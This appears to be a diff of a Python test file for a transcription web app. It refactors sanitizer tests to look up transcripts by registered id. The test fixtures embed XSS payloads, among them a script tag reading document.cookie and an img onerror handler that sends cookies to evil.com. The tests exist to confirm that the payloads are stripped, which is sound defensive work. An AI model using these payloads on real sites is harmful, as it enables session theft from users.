@@ -153,11 +153,11 @@ class TestSanitizeHtml:
 # ---------------------------------------------------------------------------
 
 def _make_transcript_client(md_content: str, monkeypatch, tmp_path: Path):
-    """Helper: write md_content to a temp output root and return (out_dir, stem).
+    """Helper: write md_content to a temp output root and return (out_dir, id).
 
     The file is registered so the route resolves it through the location API.
     ``WISPER_OUTPUT_DIR`` points at the same dir, so registration and the
-    route patch agree on the output root.
+    route agree on the output root.
     """
     from wisper_transcribe import transcript_store
 
@@ -167,17 +167,16 @@ def _make_transcript_client(md_content: str, monkeypatch, tmp_path: Path):
     stem = "xss_test"
     md = out_dir / f"{stem}.md"
     md.write_text(md_content, encoding="utf-8")
-    transcript_store.register(md, origin="reconcile")
-    return out_dir, stem
+    tid = transcript_store.register(md, origin="reconcile")
+    return out_dir, tid
 
 
 def test_transcript_detail_strips_script_tag(client: TestClient, monkeypatch, tmp_path):
     """<script> in a transcript body must not survive the rendered HTML page."""
     md = "# Transcript\n\n<script>alert(document.cookie)</script>\n\nNormal content."
-    out_dir, stem = _make_transcript_client(md, monkeypatch, tmp_path)
+    out_dir, tid = _make_transcript_client(md, monkeypatch, tmp_path)
 
-    with patch("wisper_transcribe.web.routes.transcripts.get_output_dir", return_value=out_dir):
-        resp = client.get(f"/transcripts/{stem}")
+    resp = client.get(f"/transcripts/{tid}")
 
     assert resp.status_code == 200
     assert "<script>" not in resp.text
@@ -188,10 +187,9 @@ def test_transcript_detail_strips_script_tag(client: TestClient, monkeypatch, tm
 def test_transcript_detail_strips_event_handler(client: TestClient, monkeypatch, tmp_path):
     """on* event handlers in a transcript must be removed from the rendered page."""
     md = 'Some audio <img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)"> end.'
-    out_dir, stem = _make_transcript_client(md, monkeypatch, tmp_path)
+    out_dir, tid = _make_transcript_client(md, monkeypatch, tmp_path)
 
-    with patch("wisper_transcribe.web.routes.transcripts.get_output_dir", return_value=out_dir):
-        resp = client.get(f"/transcripts/{stem}")
+    resp = client.get(f"/transcripts/{tid}")
 
     assert resp.status_code == 200
     assert "onerror" not in resp.text
@@ -201,10 +199,9 @@ def test_transcript_detail_strips_event_handler(client: TestClient, monkeypatch,
 def test_transcript_detail_preserves_safe_content(client: TestClient, monkeypatch, tmp_path):
     """The sanitizer must not mangle legitimate markdown-rendered HTML."""
     md = "**Alice**: Hello there.\n\n**Bob**: Hi Alice!"
-    out_dir, stem = _make_transcript_client(md, monkeypatch, tmp_path)
+    out_dir, tid = _make_transcript_client(md, monkeypatch, tmp_path)
 
-    with patch("wisper_transcribe.web.routes.transcripts.get_output_dir", return_value=out_dir):
-        resp = client.get(f"/transcripts/{stem}")
+    resp = client.get(f"/transcripts/{tid}")
 
     assert resp.status_code == 200
     assert "Alice" in resp.text
@@ -275,7 +272,7 @@ def test_no_stack_trace_in_500_response():
     # than having the TestClient re-raise the exception in the test process.
     with TestClient(app, raise_server_exceptions=False) as client:
         with patch(
-            "wisper_transcribe.web.routes.transcripts.get_output_dir",
+            "wisper_transcribe.transcript_store.list_transcripts",
             side_effect=RuntimeError("secret internal path: /home/user/.config"),
         ):
             resp = client.get("/transcripts")
